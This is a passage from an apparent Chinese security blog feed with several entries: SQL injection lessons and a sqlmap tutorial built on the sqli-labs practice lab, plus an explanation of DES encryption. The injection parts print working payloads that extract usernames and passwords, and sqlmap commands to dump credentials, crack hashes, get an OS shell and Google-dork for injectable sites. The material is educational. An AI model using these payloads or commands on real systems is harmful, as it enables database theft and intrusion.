group_concat(username,password) from <span class="built_in">users</span>),0x7e,floor(rand(0)*2)))<span class="comment">#    爆出所有字段名</span></span><br><span class="line"> </span><br><span class="line">1<span class="string">&#x27; and (select 1 from(select count(*) from information_schema.columns where table_schema=database() group by concat(0x7e,(select password from users where username=&#x27;</span>admin1<span class="string">&#x27;),0x7e,floor(rand(0)*2)))a)#    爆出该账户的密码。</span></span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MYSQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试工具-sqlmap</title>
      <link href="/2023/09/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-SQLMap/"/>
      <url>/2023/09/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7-SQLMap/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLMap简介"><a href="#SQLMap简介" class="headerlink" title="SQLMap简介"></a>SQLMap简介</h1><ul><li>SQLMAP是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL和SQL注入漏洞，其广泛的功能和选项包括数据库指纹，枚举，数据库提权，访问目标文件系统，并在获取操作权限时执行任意命令。</li><li>支持的数据库有<code>MySQL</code>, <code>Oracle</code>,<code>PostgreSQL</code>, <code>Microsoft SQL Server</code>, <code>Microsoft Access</code>, <code>IBM DB2</code>, <code>SQLite</code>, <code>Firebird</code>,<code>Sybase</code>和<code>SAP MaxDB</code>。</li><li>sqlmap支持五种不同的注入模式：</li></ul><ol><li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入；</li><li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</li><li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</li><li>联合查询注入，可以使用union的情况下的注入；</li><li>堆查询注入，可以同时执行多条语句的执行时的注入；</li></ol><ul><li>以下采用sqli-labs靶场为实例工具</li></ul><h1 id="SQLMap基础操作"><a href="#SQLMap基础操作" class="headerlink" title="SQLMap基础操作"></a>SQLMap基础操作</h1><h2 id="常用命令及参数"><a href="#常用命令及参数" class="headerlink" title="常用命令及参数"></a>常用命令及参数</h2><ul><li>查看sqlmap的命令帮助手册<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-h,--help       #显示基本帮助信息并退出</span><br><span class="line">-u  &quot;url&quot;#检测注入点</span><br><span class="line">--dbs#列出所有数据库的名称</span><br><span class="line">--current-db#列出当前数据库的名称</span><br><span class="line">-D#指定一个数据库</span><br><span class="line">--table#列出所有表名</span><br><span class="line">-T#指定表名</span><br><span class="line">--columns#列出所有字段名</span><br><span class="line">-C#指定字段</span><br><span class="line">--dump#列出字段内容</span><br><span class="line">-r XXX.txt      #post注入，XXX.txt为http数据包</span><br><span class="line">-cookie         #指定cookie</span><br><span class="line">-os -shell      #获取shell</span><br><span class="line">sqlmap -g &quot;inurl:php?id=&quot;   #利用Google自动搜索注入点</span><br></pre></td></tr></table></figure></li></ul><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><ul><li>以sqli-labs-less-1为例</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212017.png" alt="image.png"><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[21:04:29] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web application technology: PHP 5.4.45, Apache 2.4.39</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br></pre></td></tr></table></figure></li><li>出现以上信息，显示存在注入</li><li>当SQLMap执行该命令时，它会执行以下步骤：</li></ul><ol><li>判断可注入的参数；</li><li>判断可以用哪种SQL注入技术来注入；</li><li>识别出哪种数据库；</li><li>根据用户选择，读取哪些数据。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">Parameter: <span class="built_in">id</span> (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND 4622=4622 AND &#x27;</span>Ihts<span class="string">&#x27;=&#x27;</span>Ihts</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND GTID_SUBSET(CONCAT(0x7171766271,(SELECT (ELT(8159=8159,1))),0x7170766271),8159) AND &#x27;</span>UFpr<span class="string">&#x27;=&#x27;</span>UFpr</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: <span class="built_in">id</span>=2<span class="string">&#x27; AND (SELECT 6178 FROM (SELECT(SLEEP(5)))AVtu) AND &#x27;</span>YciD<span class="string">&#x27;=&#x27;</span>YciD</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: <span class="built_in">id</span>=-8329<span class="string">&#x27; UNION ALL SELECT NULL,CONCAT(0x7171766271,0x644b754a625073464c596c784579745179626a55784b52796e49735569565054525245766241426c,0x7170766271),NULL-- -</span></span><br><span class="line"><span class="string">---</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>给出的信息当中显示，可以注入的参数是id</li><li>可以使用布尔盲注、报错注入、时间注入、联合注入</li></ul><h2 id="列出所有数据库的名字"><a href="#列出所有数据库的名字" class="headerlink" title="列出所有数据库的名字"></a>列出所有数据库的名字</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --dbs</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212634.png" alt="image.png"></li><li>通过这个命令可以直接获取到所有数据库的名字</li><li>当继续注入时，<code>-dbs</code>缩写成<code>-D XXX</code>，意思是在XXX数据库中继续查询其他数据</li></ul><h2 id="获取数据库中的表名"><a href="#获取数据库中的表名" class="headerlink" title="获取数据库中的表名"></a>获取数据库中的表名</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security --tables</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921212938.png" alt="image.png"></li><li>通过这个命令，可以获取到指定数据库的所有表名</li><li>当继续注入时，<code>-tables</code>缩写成<code>-T</code>，意思是在指定表继续查询</li></ul><h2 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --columns</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213155.png" alt="image.png"></li><li>通过这个命令，可以获取到指定表的所有字段名</li><li>在后续的注入中， -columns缩写成-C，意思是在指定字段名查询</li></ul><h2 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C username,password --dump</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213525.png" alt="image.png"></li><li>通过这个命令，可以获取到指定字段内容</li></ul><h2 id="获取数据库的所有用户"><a href="#获取数据库的所有用户" class="headerlink" title="获取数据库的所有用户"></a>获取数据库的所有用户</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --users</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921213822.png" alt="image.png"></li><li>该命令的作用是列出数据库的所有用户</li><li>在当前用户有权限读取包含所有用户的表的权限时，使用该命令就可以列出所有管理用户。</li></ul><h2 id="获取数据库用户的密码"><a href="#获取数据库用户的密码" class="headerlink" title="获取数据库用户的密码"></a>获取数据库用户的密码</h2><ul><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --password</code></li><li>该命令的作用是列出数据库用户的密码，如下所示,如果当前用户有读取包含用户密码的权限， SQLMap会先列举出用户，然后列出Hash ，并尝试破解。</li></ul><h2 id="判断文本中的请求是否存在注入"><a href="#判断文本中的请求是否存在注入" class="headerlink" title="判断文本中的请求是否存在注入"></a>判断文本中的请求是否存在注入</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921214700.png" alt="image.png"></p><ul><li>用burpsuite抓包工具抓取到加载HTTP请求，将内容放入文本文档当中<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921214919.png" alt="image.png"></li><li><code>sqlmap -r less-1.txt  </code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921215213.png" alt="image.png"></li><li><code>-r</code>通常用于存在cookie注入时使用</li></ul><h1 id="SQLMap进阶操作"><a href="#SQLMap进阶操作" class="headerlink" title="SQLMap进阶操作"></a>SQLMap进阶操作</h1><h2 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h2><ul><li><code>--level 5</code>指需要执行的测试等级，一共有5个等级</li><li>默认是1，这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。</li><li>总之，在不确定哪个Payload或者参数为注入点时，为了确保全面性，建议使用高的level值。</li></ul><h2 id="当前用户是否为管理权限"><a href="#当前用户是否为管理权限" class="headerlink" title="当前用户是否为管理权限"></a>当前用户是否为管理权限</h2><ul><li>该命令用于查看当前账户是否为数据库管理员账户</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --is-dba</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921220356.png" alt="image.png"></li></ul><h2 id="列出数据库管理员角色"><a href="#列出数据库管理员角色" class="headerlink" title="列出数据库管理员角色"></a>列出数据库管理员角色</h2><ul><li>该命令用于查看数据库用户的角色。如果当前用户有权限读取包含所有用户的 表，输入该命令会列举出每个用户的角色，也可以用-U参数指定想看哪个用户的角色。</li><li><code>sqlmap -u &quot;http://192.168.3.3/sqli-labs-master/Less-1/?id=1&quot; --roles</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921220941.png" alt="image.png"></li></ul><h2 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h2><ul><li><strong><code>Referer</code></strong> 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 <code>Referer</code> 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。</li><li>SQLMap可以在请求中伪造HTTP中的refer”当level参数设定为3或3 以上时，会尝试对refere注入。可以使用refere命令来欺骗，如 <code>--referer http:// www.baidu.com</code></li></ul><h2 id="运行自定义SQL语句"><a href="#运行自定义SQL语句" class="headerlink" title="运行自定义SQL语句"></a>运行自定义SQL语句</h2><ul><li>该命令用于执行指定的SQL语句</li><li>以<code>select * from users limit 0,1</code>为例<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230921221923.png" alt="image.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DES加密原理</title>
      <link href="/2023/09/13/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/"/>
      <url>/2023/09/13/DES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h1><h2 id="DES算法简介"><a href="#DES算法简介" class="headerlink" title="DES算法简介"></a>DES算法简介</h2><ul><li>DES是一种明文分组为64比特，有效密钥56比特，输出密文64比特的，具有16轮迭代的Feistel密码算法。</li><li>DES由初始置换，16轮迭代，初始逆置换组成。</li></ul><h2 id="算法加密流程描述"><a href="#算法加密流程描述" class="headerlink" title="算法加密流程描述"></a>算法加密流程描述</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913215648.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913222123.png" alt="image.png"></p><ol><li>输入64位明文，进行初始置换IP</li><li>将明文分成左右两部分，为L0，R0，各32位</li><li>在密钥的控制下，进行16次运算</li><li>运算结束将左右交换，连接在一起再进行逆置换</li><li>最后输出64位密文</li></ol><h1 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h1><h2 id="初始置换"><a href="#初始置换" class="headerlink" title="初始置换"></a>初始置换</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913220034.png" alt="image.png"></p><ul><li>将输入的明文按照上表进行置换</li><li>例如，输出块的第1位对应输入块的第58位，第2位对应第50位，依次类推</li><li>则输入块是D1~D64，输出块是D58，D50，D42，……，D15，D7；</li><li>然后将输出块左右分成L0和R0</li></ul><h2 id="加密16轮迭代"><a href="#加密16轮迭代" class="headerlink" title="加密16轮迭代"></a>加密16轮迭代</h2><h3 id="密钥置换"><a href="#密钥置换" class="headerlink" title="密钥置换"></a>密钥置换</h3><ul><li>密钥共有64位，16轮迭代后为48为子密钥</li></ul><ol><li>将密钥的奇偶位忽略不计（就是每个字节的第八位），64位变为56位，根本选择置换PC-1将56位的密钥分成左C0（28位），右D0（28位），表中第8、16、24、…、64位被忽略<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913220958.png" alt="image.png"></li><li>根据轮数，将Cn，Dn进行左移<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221141.png" alt="image.png"></li></ol><ul><li>比如C0和D0进行第一次左移，根据表格，是左移一位，得到以下<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C1</span><br><span class="line">49,41,33,25,17,9,1,  </span><br><span class="line">58,50,42,34,26,18,10,  </span><br><span class="line">2,59,51,43,35,27,19,  </span><br><span class="line">11,3,60,52,44,36,57</span><br><span class="line">D1</span><br><span class="line">55,47,39,31,23,15,7,  </span><br><span class="line">62,54,46,38,30,22,14,  </span><br><span class="line">6,61,53,45,37,29,21,  </span><br><span class="line">13,5,28,20,12,4,63</span><br></pre></td></tr></table></figure></li></ul><ol start="3"><li>然后C1和D1合并，经过置换选择表2（PC-2），生成48位的子密钥，表格如下<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221434.png" alt="image.png"></li><li>此后每次都进行拆分，然后左移，再合并，然后经过PC-2生成子密钥K</li><li>依次类推，得到K1~K16</li></ol><h3 id="扩展置换E"><a href="#扩展置换E" class="headerlink" title="扩展置换E"></a>扩展置换E</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221636.png" alt="image.png"></p><ul><li>根据以上表格，将32位扩展为48位</li><li>中间为原本的32位，两边位扩展的位，总共48位</li></ul><h3 id="S-盒代替"><a href="#S-盒代替" class="headerlink" title="S-盒代替"></a>S-盒代替</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913221941.png" alt="image.png"></p><ol><li>Rn经过扩展，为48位，与48位的Kn进行异或运算，得到48位输出块，为8个6bit的串，分别为B1~B8</li><li>根据上表，对应S1~S8，进行代替操作，这一步是将6bit的串，前后各一位对应纵列，中间四位对应行，例如110010以S1为例，在行当中找到1001对应的十六进制9，在列当中找到10对应的十六进制2，对应十六进制12，则输出为1100</li></ol><h3 id="P-盒置换"><a href="#P-盒置换" class="headerlink" title="P-盒置换"></a>P-盒置换</h3><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913222957.png" alt="image.png"></p><ol><li>S-盒代替之后，每盒有4位，共八盒，就是32位，作为P-盒的输入块</li><li>根据上表，对Rn进行置换，得到的串与左部分Ln进行异或运算，得到的串赋值给R(n+1)</li><li>R(n)直接赋值给L(n+1)</li><li>然后再进行下一次迭代</li></ol><h2 id="逆置换"><a href="#逆置换" class="headerlink" title="逆置换"></a>逆置换</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230913224505.png" alt="image.png"></p><ul><li>以上的迭代算法成为函数f</li><li>进行完16次迭代，得到L16和R16，然后将LR调换，最后合并为64位的输出块，进行逆置换</li><li>逆置换根据上表，对应的位进行置换，逆置换是初始置换的逆运算，就是说初始置换输出的第1位是原始输入的第58位，第2位是第50位，而逆置换输出的第58位是输入的第1位，输出的第50位是输入的第2位</li><li>最后得到的64位输出块，则是DES加密的最终密文</li></ul>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小迪安全 Day14 WEB漏洞-SQL注入之类型及提交注入</title>
      <link href="/2023/09/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day14%20WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/09/09/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%20Day14%20WEB%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%B1%BB%E5%9E%8B%E5%8F%8A%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909150934.png" alt="image.png"></p><h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>在真实SQL注入安全测试中，我们一定要先明确提交数据及提交方法后再进行注入，其中提交数据类型和提交方法可以通过抓包分析获取,后续安全测试中我们也必须满足同等的操作才能进行注入。</li></ul><h2 id="简要明确参数类型"><a href="#简要明确参数类型" class="headerlink" title="简要明确参数类型"></a>简要明确参数类型</h2><ul><li>数字、字符、搜索、JSON等</li><li>直接输入的则为数字，如果是字符，则需要加上单引号</li><li>如果网站有搜索功能，那么搜索语句通常使用到%百分号</li></ul><h2 id="简要明确请求方法"><a href="#简要明确请求方法" class="headerlink" title="简要明确请求方法"></a>简要明确请求方法</h2><ul><li>GET,POST,COOKIE,REQUEST,HTTP头等</li><li>其中sql语句干扰符号：’，”，s，)，}等，具体需看写法</li></ul><h1 id="参数字符型注入测试"><a href="#参数字符型注入测试" class="headerlink" title="参数字符型注入测试"></a>参数字符型注入测试</h1><ul><li>sqli-labs less-5源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Less-<span class="number">5</span> Double Query- Single Quotes- String&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">&quot;#000000&quot;</span>&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot; margin-top:60px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">&quot;3&quot;</span> color=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;<span class="comment">#SQL执行的语句</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">&quot;../images/Less-5.jpg&quot;</span> /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>SQL执行的语句是采用了’ ‘闭合</li><li>我们要是直接使用<code>?id=1 and 1=1</code>相当于执行的是<code>SELECT * FROM users WHERE id=&#39;1 and 1=1&#39; LIMIT 0,1;</code>，是不会有任何反应的<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909160210.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909160810.png" alt="image.png"></li><li>正确的报错语句<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>2</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161612.png" alt="image.png"><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161622.png" alt="image.png"></li><li>相当于在数据库执行<code> select * from users where id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161717.png" alt="image.png"></li><li>获取字段<code>?id=1&#39; order by 4 --+</code></li><li><code>--+</code>将后面的代码注释不执行<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909161845.png" alt="image.png"></li><li>在数据库中执行<code> select * from users where id=&#39;1&#39; order by 4;</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909162119.png" alt="image.png"></li><li>less-6源代码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure></li><li>可以看出采用了双引号的方式进行了编码，绕过方法”闭合前面的引号，后面采用–+注释</li><li><code>?id=1&quot; order by 4 --+</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909162832.png" alt="image.png"></li></ul><h1 id="POST数据提交注入测试"><a href="#POST数据提交注入测试" class="headerlink" title="POST数据提交注入测试"></a>POST数据提交注入测试</h1><ul><li>sqli-labs less-11</li><li>输入错误的用户名密码<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20230909164153.png" alt="image.png"></li><li>输入正确的用户名密码<br><img 